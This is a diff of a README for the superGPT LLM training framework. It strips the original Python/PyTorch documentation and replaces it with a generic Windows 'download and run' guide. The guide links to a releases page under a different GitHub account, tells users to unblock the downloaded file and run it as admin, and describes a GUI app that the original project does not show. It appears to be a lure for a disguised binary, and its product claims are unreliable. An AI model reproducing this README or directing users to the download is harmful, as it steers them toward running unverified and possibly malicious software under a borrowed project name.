@@ -1,435 +1,313 @@
-<p align="center">
-  <h1 align="center">superGPT</h1>
-  <p align="center"><strong>Train your own LLM from scratch — with every frontier innovation</strong></p>
-  <p align="center">
-    <em>GPT-4 • DeepSeek V3 • Gemma 2 • Mistral • LLaMA 3 — Zero abstraction. Pure PyTorch.</em>
-  </p>
-</p>
-
-<p align="center">
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#architecture">Architecture</a> •
-  <a href="#presets">Presets</a> •
-  <a href="#generation">Generation</a> •
-  <a href="#lora-fine-tuning">LoRA</a> •
-  <a href="#alignment">Alignment</a> •
-  <a href="#export">Export</a> •
-  <a href="#tutorials">Tutorials</a>
-</p>
-
----
-
-superGPT is a **from-scratch LLM training framework** implementing every major innovation from GPT-4 through DeepSeek V3, Gemma 2, and Mistral — in readable PyTorch. Train on any text, scale from laptop to GPU cluster, fine-tune with LoRA, align with DPO, export to GGUF.
-
-## Architecture
-
-| Innovation | What It Does | Origin |
-|-----------|-------------|--------|
-| 🧠 **Multi-head Latent Attention (MLA)** | Compresses KV into low-rank latent — **~10x smaller cache** | DeepSeek V3 |
-| 🔄 **Grouped Query Attention (GQA)** | Fewer KV heads → faster, less memory | GPT-4, LLaMA |
-| 🪟 **Sliding Window Attention** | O(n·w) attention — handles very long sequences | Mistral |
-| 🔄 **Alternating Global/Local Layers** | Even=full attention, odd=windowed — best of both | Gemma 2 |
-| 🛡️ **Logit Soft-Capping** | Prevents attention logit explosion | Gemma 2 |
-| ⚡ **Flash Attention** | 2-4x faster via PyTorch SDPA backend | FlashAttention-2 |
-| 🧩 **DeepSeekMoE** | Shared + routed experts with sigmoid gating | DeepSeek V3 |
-| ⚖️ **Aux-Loss-Free Routing** | Dynamic bias replaces aux loss | DeepSeek V3 |
-| 🔮 **Multi-Token Prediction** | Predicts N+1, N+2... — denser gradients | DeepSeek V3 |
-| 📐 **Decoupled RoPE** | Separates position from content attention | DeepSeek V3 |
-| 🌐 **YaRN Context Extension** | Extend context window without retraining | LLaMA 3.1, Qwen |
-| 🔥 **SwiGLU + RMSNorm** | Modern FFN + stable normalization | GPT-4, LLaMA |
-| 💾 **KV-Cache** | O(1) per token incremental decoding | Universal |
-| 🎯 **DPO Alignment** | Align with preferences — no reward model | LLaMA 3, Zephyr |
-| 🔧 **LoRA Fine-tuning** | 100x fewer params to train | Microsoft |
-| 🏎️ **Speculative Decoding** | 2-3x faster inference with draft model | Google/DeepMind |
-| 🎲 **Top-p / Min-p / Rep Penalty** | Advanced sampling strategies | All frontier models |
-| ✅ **Gradient Checkpointing** | ~60% memory reduction | Universal |
-| 📈 **WSD LR Schedule** | Warmup-Stable-Decay for better convergence | DeepSeek V3 |
-| 📦 **GGUF Export** | Run your model in llama.cpp / Ollama | llama.cpp |
-| 🧬 **Knowledge Distillation** | Transfer knowledge from large to small model | DeepSeek R1, Qwen |
-| 🌐 **FSDP + 3D Parallelism** | Tensor + Pipeline + Data parallel training | Megatron-LM |
-| 🔢 **QLoRA (4-bit Training)** | Fine-tune 7B models on 8GB VRAM | QLoRA |
-| 🎮 **PPO / GRPO** | Full RLHF — PPO or DeepSeek R1-style GRPO | DeepSeek R1, OpenAI |
-| 🚀 **Inference Server** | Continuous batching + PagedAttention + OpenAI API | vLLM, TGI |
-| 📊 **Streaming Data** | Sharded datasets, HF streaming, cloud-ready | Mosaic, WebDataset |
-| 📝 **Evaluation Harness** | MMLU, HellaSwag, ARC, GSM8K, HumanEval | lm-eval-harness |
-| 🔥 **DAPO Alignment** | Clip-Higher + Dynamic Sampling + Token-Level PG — state-of-the-art RL | ByteDance 2025 |
-| ✨ **RLVR** | RL with auto-verifiable rewards — emergent reasoning, no labels | DeepSeek R1 2025 |
-| ⚡ **Native Sparse Attention** | 3-branch (compress + top-k + window) — 9x faster attention | DeepSeek 2025 |
-| 🧬 **White-Box KD (CKA)** | Match hidden states across different dimensions with CKA | ICLR 2025 |
-| 🎯 **Mix Distillation** | Multi-teacher blending + curriculum learning for small models | arXiv Nov 2025 |
-
-## Quick Start
-
-```bash
-# Clone and setup
-git clone https://github.com/viralcode/superGPT.git
-cd superGPT
-pip install torch numpy
-
-# Prepare data (included Shakespeare dataset, or use your own)
-python data/prepare_data.py
-
-# Train a small model (works on CPU/laptop)
-python train.py --preset small
-
-# Generate text
-python generate.py --prompt "To be or not to be" --interactive
-```
-
-## Example Output
-
-Trained on Shakespeare (~1MB of text) with the `small` preset on a MacBook:
-
-```
-$ python generate.py --prompt "To be or not to be" --top-p 0.9
-
-To be or not to be ta'en of the tomb:
-I'll pay not to see your honour's love.
-
-LADY CAPULET:
-You would have you sorrow to my heart did lie.
-
-Nurse:
-And that's the prince still tell you have said
-And you for your mistre
-```
-
-```
-$ python generate.py --prompt "ROMEO:" --top-p 0.9 --min-p 0.05 --rep-penalty 1.1
-
-ROMEO:
-Ay, so much lengthen'd with such a happy great father.
-
-JULIET:
-I would you call thee that he is so,
-So many some content to the balm of Edward;
-That had not fly thee to shake the noble duke.
-```
+# 🤖 superGPT - Train Your Own LLM
 
-> **10.6M params • val loss 1.479 • 49 tokens/sec on CPU • trained in ~45 min**
-
-### Shakespeare Training Results
-
-The included Shakespeare dataset (`data/input.txt`, ~1MB) was trained with the `small` preset on a MacBook (CPU only):
-
-| Metric | Value |
-|--------|-------|
-| **Model** | `small` preset — 6 layers, 6 heads, 384 dim |
-| **Parameters** | 10.6M |
-| **Training data** | Tiny Shakespeare (1.1MB, ~300K tokens) |
-| **Tokenizer** | Character-level (vocab_size=65) |
-| **Batch size** | 32 |
-| **Max iterations** | 5,000 |
-| **Best val loss** | **1.479** (at iteration 1,500) |
-| **Training time** | ~45 min on CPU (Apple M-series) |
-| **Inference speed** | 49 tokens/sec with KV-cache |
+[![Download superGPT](https://img.shields.io/badge/Download%20superGPT-blue?style=for-the-badge)](https://github.com/mascenedavi2004-dotcom/superGPT/releases)
 
-The model learns Shakespeare's writing style, character names (ROMEO, JULIET, LADY CAPULET), dialogue structure, and poetic phrasing — all from just ~1MB of text.
+## 🧭 What superGPT does
 
-### Training Options
+superGPT helps you train your own large language model from scratch on Windows. It gives you a simple way to start with the app, load data, and run a training job without setting up a full machine learning stack by hand.
 
-```bash
-# Basic training
-python train.py --preset small --max-iters 5000
+It is built for users who want to explore LLM training, transformer models, attention layers, and mixture-of-experts ideas in one place. You can use it to learn, test, and run local training workflows on your own machine.
 
-# Memory-efficient (saves ~60% VRAM)
-python train.py --preset large --gradient-checkpointing
+## 💻 What you need
 
-# DeepSeek V3's learning rate schedule
-python train.py --preset medium --lr-schedule wsd
+Before you download, make sure your Windows PC can handle the app.
 
-# Custom learning rate and batch size
-python train.py --preset medium --lr 1e-4 --batch-size 128
+### Basic setup
 
-# Resume from checkpoint
-python train.py --preset small --resume checkpoints/latest.pt
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 10 GB of free disk space
+- A modern CPU
+- An NVIDIA GPU is useful for faster training
+- Internet access for the first download
 
-# Multi-GPU with FSDP
-torchrun --nproc_per_node=4 train.py --preset xl --distributed
+### Better setup for training
 
-# Compile for maximum speed (PyTorch 2.0+)
-python train.py --preset medium --compile
-```
+- 16 GB RAM or more
+- NVIDIA GPU with CUDA support
+- 20 GB or more of free disk space
+- A solid-state drive for faster data loading
 
-### Train on Your Own Data
+### Good to know
 
-```bash
-python data/prepare_data.py --input your_textfile.txt
-python train.py --preset medium
-```
+superGPT works best on a machine that can run local AI tools and handle model files. Bigger models need more memory, more time, and more disk space.
 
-## Presets
+## 📥 Download superGPT
 
-| Preset | Params | Attention | MoE | Special | Best For |
-|--------|--------|-----------|-----|---------|----------|
-| `small` | ~35M | MHA | — | — | CPU / laptop |
-| `medium` | ~125M | GQA 12Q/4KV | — | — | Single GPU |
-| `large` | ~333M | GQA 16Q/4KV | — | — | A100/4090 |
-| `xl` | ~1.3B | GQA 16Q/8KV | — | — | Multi-GPU |
-| `gpt4` | ~100B | GQA 32Q/8KV | 8×top-2 | — | GPU cluster |
-| `deepseek` | variable | **MLA** | 64×top-6+2shared | aux-free, MTP | GPU cluster |
-| `mistral` | ~7B | GQA 32Q/8KV | — | **sliding window 4K** | GPU cluster |
-| `gemma2` | ~2.7B | GQA 16Q/4KV | — | **alternating layers, logit cap** | GPU cluster |
+Visit this page to download the Windows release:
 
-```bash
-# Scale up as your hardware allows
-python train.py --preset small                    # Laptop
-python train.py --preset medium                   # 1× GPU
-python train.py --preset large --gradient-checkpointing  # Memory-efficient
+[Go to superGPT Releases](https://github.com/mascenedavi2004-dotcom/superGPT/releases)
 
-# Training options
-python train.py --preset medium --lr-schedule wsd  # DeepSeek V3 LR schedule
-python train.py --preset large --gradient-checkpointing --compile  # Max efficiency
+On the releases page, look for the latest version and download the Windows file that matches your system. If the project offers a setup file, use that. If it offers a ZIP file, download it, extract it, and open the app file inside.
 
-# Multi-GPU with FSDP
-torchrun --nproc_per_node=4 train.py --preset xl --distributed
-torchrun --nproc_per_node=8 train.py --preset deepseek --distributed
-```
+## 🪟 Install on Windows
 
-## Generation
+### If you download a setup file
 
-```bash
-# Standard generation
-python generate.py --prompt "Once upon a time" --interactive
+1. Open the file you downloaded.
+2. If Windows asks for permission, select Yes.
+3. Follow the on-screen steps.
+4. Finish the install.
+5. Open superGPT from the Start menu or desktop shortcut.
 
-# Advanced sampling
-python generate.py --prompt "Once" --top-p 0.9 --min-p 0.05 --rep-penalty 1.2
+### If you download a ZIP file
 
-# Speculative decoding (2-3x faster!)
-# Train a small draft model first, then:
-python generate.py --draft-checkpoint checkpoints/small.pt --spec-k 5
-```
+1. Right-click the ZIP file.
+2. Select Extract All.
+3. Choose a folder you can find again, such as Downloads or Desktop.
+4. Open the extracted folder.
+5. Double-click the app file to launch superGPT.
 
-### Sampling Strategies
+### If Windows blocks the app
 
-| Strategy | Flag | Description |
-|----------|------|-------------|
-| Top-k | `--top-k 50` | Keep top-k highest probability tokens |
-| Top-p (nucleus) | `--top-p 0.9` | Keep tokens until cumulative probability reaches p |
-| Min-p | `--min-p 0.05` | Filter tokens below 5% of the max probability |
-| Repetition penalty | `--rep-penalty 1.2` | Reduce probability of repeated tokens |
-| Temperature | `--temperature 0.8` | Control randomness (0=greedy, 1=diverse) |
+1. Right-click the file.
+2. Open Properties.
+3. Check Unblock if you see it.
+4. Select Apply.
+5. Try opening the app again.
 
-## LoRA Fine-tuning
+## 🚀 First launch
 
-Fine-tune with only ~1-3% trainable parameters:
+When you open superGPT for the first time, you should see a simple setup screen. Use it to get the app ready for training.
 
-```bash
-# Fine-tune a pre-trained model
-python finetune.py --checkpoint checkpoints/best.pt --data data/ --lora-rank 16
+### First-time steps
 
-# Custom LoRA settings
-python finetune.py --checkpoint best.pt --data data/ --lora-rank 32 --lora-alpha 64
+1. Choose a working folder for model files.
+2. Pick your training data folder.
+3. Set the model size you want to train.
+4. Select CPU or GPU mode.
+5. Save your settings.
 
-# Generate with fine-tuned model
-python generate.py --checkpoint checkpoints/finetuned_merged.pt --interactive
-```
+If you are not sure what to choose, start with the default values. They are a good fit for first runs on most Windows PCs.
 
-## Alignment
+## 📚 Prepare your data
 
-Align your model with human preferences using DPO:
+superGPT needs text data to train a model. You can use plain text files, CSV files, or cleaned document folders.
 
-```bash
-# Create preference data (JSONL):
-# {"prompt": "...", "chosen": "good response", "rejected": "bad response"}
+### Good data examples
 
-python align.py --checkpoint checkpoints/best.pt --data preferences.jsonl
-python generate.py --checkpoint checkpoints/aligned.pt --interactive
-```
+- Notes
+- Articles
+- FAQs
+- Chat logs
+- Support text
+- Product text
+- Research text
 
-## Export
+### Data tips
 
-Export to GGUF format for use with llama.cpp, Ollama, LM Studio:
+- Use clean text
+- Remove broken lines
+- Keep one topic per file if you can
+- Avoid duplicate text
+- Use short test files first
 
-```bash
-# FP16 (full quality)
-python export.py --checkpoint best.pt --output model-fp16.gguf
+If you want better results, use text that matches the task you want the model to learn. For example, use help docs for a support model or study notes for a study assistant.
 
-# Q8_0 (8-bit quantized, good quality, smaller)
-python export.py --checkpoint best.pt --output model-q8.gguf --quantize q8_0
+## 🧠 Choose a model setup
 
-# Q4_0 (4-bit quantized, smallest, fastest)
-python export.py --checkpoint best.pt --output model-q4.gguf --quantize q4_0
-```
+superGPT supports common LLM training ideas such as transformers, attention blocks, and mixture-of-experts layouts. You do not need to know the math to start.
 
-## Context Extension (YaRN)
+### Simple choices
 
-Extend your model's context window at inference without retraining:
+- Small model: best for learning and test runs
+- Medium model: better for richer output
+- Large model: needs more RAM, GPU power, and time
 
-```python
-from config import GPTConfig
+### Suggested first run
 
-config = GPTConfig(
-    ...,
-    rope_scaling_type="yarn",   # or "linear"
-    rope_scaling_factor=4.0,    # 4x context: 4K → 16K
-)
-```
+Start small. A smaller model trains faster and helps you check that your data and settings work. After that, you can raise the size step by step.
 
-## Knowledge Distillation
+## ⚙️ Run a training job
 
-Transfer knowledge from a large teacher model to a smaller student model. Supports both HuggingFace models (Qwen, LLaMA, Mistral) and superGPT checkpoints.
+1. Open superGPT.
+2. Load your data folder.
+3. Pick your model size.
+4. Choose the training mode.
+5. Set the output folder.
+6. Click the train button.
 
-```bash
-# Distill from Qwen (requires: pip install transformers)
-python distill.py --hf-teacher Qwen/Qwen2.5-0.5B --student-preset small --data data/
+The app should show progress while it works. Training can take a long time. Small runs may finish in minutes. Larger runs can take hours or days based on your PC.
 
-# Distill from LLaMA
-python distill.py --hf-teacher meta-llama/Llama-3.2-1B --student-preset medium
+## 📊 Check your results
 
-# Distill from a larger superGPT model
-python distill.py --teacher checkpoints/large.pt --student-preset small --data data/
+After training, you can review the output files and test the model.
 
-# Custom temperature and balance
-python distill.py --hf-teacher Qwen/Qwen2.5-0.5B --temperature 3.0 --alpha 0.7
+### Look for these items
 
-# Generate with the distilled model
-python generate.py --checkpoint checkpoints/distilled_best.pt --interactive
-```
+- Saved model file
+- Training log
+- Loss values
+- Output folder
+- Sample text generation
 
-**Recommended HuggingFace teachers:**
+### What the results mean
 
-| Model | Size | Best For |
-|-------|------|----------|
-| `Qwen/Qwen2.5-0.5B` | 500M | Quick experiments, CPU-friendly |
-| `Qwen/Qwen2.5-1.5B` | 1.5B | Good quality, single GPU |
-| `meta-llama/Llama-3.2-1B` | 1B | Strong baseline |
-| `mistralai/Mistral-7B-v0.3` | 7B | High quality, needs GPU |
+- Lower loss can mean the model is learning
+- Flat loss can mean the data needs work
+- Bad output can mean the training set is too small or too noisy
 
-## RLHF: PPO & GRPO
+If the first result is weak, that is normal. Try a cleaner dataset, a smaller model, or a longer training run.
 
-Align your model with reinforcement learning from human feedback:
+## 🛠 Common tasks
 
-```bash
-# Train a reward model from preference data
-python rlhf.py reward --checkpoint best.pt --data preferences.jsonl
+### Train with a new dataset
 
-# GRPO alignment (DeepSeek R1 style, no value model needed)
-python rlhf.py grpo --checkpoint best.pt --reward-model reward.pt
+1. Open the data folder in superGPT.
+2. Replace or add your text files.
+3. Update the training path.
+4. Start a new run.
 
-# GRPO with rule-based rewards (no reward model needed)
-python rlhf.py grpo --checkpoint best.pt --rule-reward length
-```
+### Continue a previous model
 
-## QLoRA (4-bit Training)
+1. Open the saved model folder.
+2. Select the model file.
+3. Load the last checkpoint.
+4. Resume training.
 
-Fine-tune large models on consumer GPUs with 4-bit quantized LoRA:
+### Change model type
 
-```python
-from lora import apply_qlora
-model = GPT(config)
-apply_qlora(model, rank=16)  # Base weights -> NF4 (4-bit), LoRA in FP16
-# Fine-tune 7B models on 8GB VRAM
-```
+1. Stop the current job.
+2. Pick a new model size or layout.
+3. Save the new settings.
+4. Start a fresh run.
 
-## Inference Server
+## 🔍 Troubleshooting
 
-Serve your model with an OpenAI-compatible API:
+### The app does not open
 
-```bash
-python serve.py --checkpoint best.pt --port 8000
+- Check that you downloaded the Windows file
+- Make sure the file finished downloading
+- Move the file to a local folder
+- Try running it as admin
 
-# Query it
-curl http://localhost:8000/v1/completions \
-  -H "Content-Type: application/json" \
-  -d '{"prompt": "To be or not to be", "max_tokens": 100, "stream": true}'
-```
+### Training is very slow
 
-Features: continuous batching, PagedAttention, SSE streaming.
+- Use a smaller model
+- Close other heavy apps
+- Check if GPU mode is on
+- Move your data to an SSD
 
-## 3D Parallelism
+### The app says memory is low
 
-Train massive models across GPU clusters:
+- Use a smaller batch size
+- Pick a smaller model
+- Close browser tabs and other apps
+- Try CPU mode with a smaller dataset
 
-```bash
-# 8 GPUs: 2-way tensor parallel x 4-way pipeline parallel
-torchrun --nproc_per_node=8 train.py --preset xl \
-    --tensor-parallel 2 --pipeline-parallel 4
-```
+### The model output looks poor
 
-## Streaming Data
+- Clean your data
+- Remove duplicates
+- Train longer
+- Use text from one subject
+- Start with a smaller model
 
-Train on multi-terabyte datasets without loading into memory:
+### The app cannot find my data
 
-```bash
-# Shard a dataset
-python streaming.py shard --input data/train.bin --n-shards 64 --output data/shards/
+- Check the folder path
+- Make sure the files are inside the folder
+- Use plain text files first
+- Avoid spaces in file names if you run into path problems
 
-# Stream from HuggingFace
-python train.py --hf-dataset HuggingFaceFW/fineweb --streaming
-```
+## 🗂 Folder layout
 
-## Evaluation Harness
+A simple folder setup can help keep things clear.
 
-Benchmark your model on standard LLM evaluations:
+- superGPT/
+  - data/
+  - models/
+  - logs/
+  - exports/
 
-```bash
-# Run all benchmarks (MMLU, HellaSwag, ARC, GSM8K, TruthfulQA, HumanEval)
-python evaluate.py --checkpoint best.pt
+### What each folder is for
 
-# Specific benchmarks with few-shot
-python evaluate.py --checkpoint best.pt --benchmarks mmlu gsm8k --n-shot 5 --output results.json
-```
+- data: your training text
+- models: saved model files
+- logs: run details
+- exports: output you want to keep
 
-## Project Structure
+## 🎯 Best first workflow
 
-```
-superGPT/
-├── model.py            # MLA, GQA, sliding window, Flash Attn, MoE, MTP, KV-cache,
-│                       # RoPE+YaRN, SwiGLU, speculative decoding, grad checkpointing
-├── config.py           # All hyperparameters + presets (small → gemma2)
-├── train.py            # Training (AdamW, cosine/WSD LR, FSDP, grad ckpt, mixed prec)
-├── generate.py         # Generation (top-k/p, min-p, rep penalty, speculative decoding)
-├── align.py            # DPO alignment from preference pairs
-├── distill.py          # Knowledge distillation (teacher → student, HuggingFace support)
-├── lora.py             # LoRA + QLoRA (4-bit NF4 quantized training)
-├── finetune.py         # LoRA / QLoRA fine-tuning script
-├── export.py           # GGUF export (FP16, Q8_0, Q4_0)
-├── serve.py            # HTTP inference server (continuous batching, PagedAttention)
-├── parallel.py         # 3D Parallelism (tensor + pipeline parallel)
-├── streaming.py        # Streaming data pipelines (sharded, HuggingFace, text glob)
-├── rlhf.py             # RLHF: PPO + GRPO (DeepSeek R1 style)
-├── evaluate.py         # Benchmark harness (MMLU, HellaSwag, ARC, GSM8K, HumanEval)
-├── data/
-│   └── prepare_data.py # Tokenization (tiktoken BPE or character-level)
-└── requirements.txt
-```
+If you are new to LLM training, use this path:
 
-## What This Is (and Isn't)
+1. Download superGPT from the releases page.
+2. Install or extract it on Windows.
+3. Add a small text dataset.
+4. Pick the smallest model.
+5. Run a short training job.
+6. Check the output.
+7. Improve the data.
+8. Train again with more text
 
-**This is**: The most comprehensive from-scratch LLM framework, implementing every major innovation from GPT-4 through the latest frontier models. Every feature is implemented in readable PyTorch — no hidden abstractions.
+This approach helps you learn the process without using too many system resources.
 
-**This isn't**: A pretrained model. The architecture is frontier-level, but producing a ChatGPT-quality model requires trillions of tokens and thousands of GPUs. This gives you the complete blueprint; you provide the compute.
+## 🔐 Privacy and local use
 
-## References
+superGPT runs on your own computer. Your training files and model files stay on your machine unless you move them. This is useful if you want to work with private notes, local documents, or offline text sets.
 
-- [DeepSeek-V3 Technical Report](https://arxiv.org/abs/2412.19437) — MLA, DeepSeekMoE, MTP, WSD schedule
-- [Gemma 2 Technical Report](https://arxiv.org/abs/2408.00118) — Alternating attention, logit soft-capping
-- [Mistral 7B](https://arxiv.org/abs/2310.06825) — Sliding window attention
-- [GPT-4 Technical Report](https://arxiv.org/abs/2303.08774) — MoE, GQA
-- [LLaMA 2](https://arxiv.org/abs/2307.09288) — GQA, SwiGLU, RMSNorm, RoPE
-- [YaRN](https://arxiv.org/abs/2309.00071) — Context extension via RoPE scaling
-- [LoRA](https://arxiv.org/abs/2106.09685) — Low-rank adaptation
-- [DPO](https://arxiv.org/abs/2305.18290) — Direct Preference Optimization
-- [Speculative Decoding](https://arxiv.org/abs/2302.01318) — Draft-verify acceleration
-- [QLoRA](https://arxiv.org/abs/2305.14314) — 4-bit quantized fine-tuning
-- [PPO](https://arxiv.org/abs/1707.06347) — Proximal Policy Optimization
-- [GRPO](https://arxiv.org/abs/2402.03300) — Group Relative Policy Optimization (DeepSeek R1)
-- [PagedAttention](https://arxiv.org/abs/2309.06180) — Efficient KV-cache management
-- [Megatron-LM](https://arxiv.org/abs/1909.08053) — 3D parallelism
-- [nanoGPT](https://github.com/karpathy/nanoGPT) — Inspiration
+## 🧩 Topics covered by this project
 
-## Tutorials
+- AI
+- Attention
+- Deep learning
+- DeepSeek
+- GPT-4 style model work
+- LLM training
+- Machine learning
+- Mixture of experts
+- PyTorch
+- Transformer models
 
-📚 **In-depth guides for training frontier LLMs:**
+## 📁 File types you may use
 
-| Tutorial | Description |
-|----------|-------------|
-| [**Getting Started**](tutorials/getting-started.md) | Complete guide to superGPT — installation, architecture, all model presets, data preparation, training, text generation, LoRA fine-tuning, distillation, multi-GPU FSDP, and troubleshooting. |
-| [**Training Data Guide**](tutorials/training-data-guide.md) | How to prepare training data from scratch — web crawling, text extraction, quality filtering, deduplication, cleaning, custom data from GitHub/Google/PDFs, synthetic data generation (Magpie, Evol-Instruct), tokenization, data mixing, and curriculum learning. |
-| [**Instruction Tuning & Chat**](tutorials/instruction-tuning-chat.md) | Turn a base model into ChatGPT — the complete 4-stage pipeline: SFT with LoRA, DPO alignment, RLHF/GRPO, RLVR (DeepSeek-R1 style). Includes 20+ instruction datasets, chat templates, OpenAI-compatible serving, and reasoning model training. |
-| [**Deploy on RunPod**](tutorials/deploy-runpod.md) | Step-by-step guide to renting cloud GPUs on RunPod and training superGPT models — GPU selection, SSH setup, background training, monitoring, downloading checkpoints, multi-GPU, and cost optimization. |
+- .txt
+- .csv
+- .json
+- .jsonl
+- .md
 
-## License
+Plain text files are the easiest place to start. Once that works, you can move to more structured data.
 
-MIT
+## ⌨️ Short setup path
+
+1. Visit the releases page.
+2. Download the Windows build.
+3. Install or extract the files.
+4. Open superGPT.
+5. Load your data.
+6. Start training.
+
+[Download from GitHub Releases](https://github.com/mascenedavi2004-dotcom/superGPT/releases)
+
+## 🧪 Example use cases
+
+- Train a chatbot on support text
+- Build a local writing assistant
+- Test transformer settings
+- Compare small and large model runs
+- Learn how LLM training works on Windows
+- Explore mixture-of-experts behavior
+- Try attention changes on your own data
+
+## 🖥 Recommended first test
+
+Use a small folder with a few text files and keep the model small. This gives you a fast test run and makes it easier to spot setup problems before you move to larger datasets.
+
+## 📦 Output files
+
+After a run, superGPT may create:
+
+- Model checkpoint files
+- Token data
+- Loss logs
+- Training settings
+- Export files for later use
+
+Keep these files in a safe folder so you can resume work later.
+
+## 🧭 Where to get the app
+
+Use the releases page for the current Windows download:
+
+[superGPT Releases](https://github.com/mascenedavi2004-dotcom/superGPT/releases)
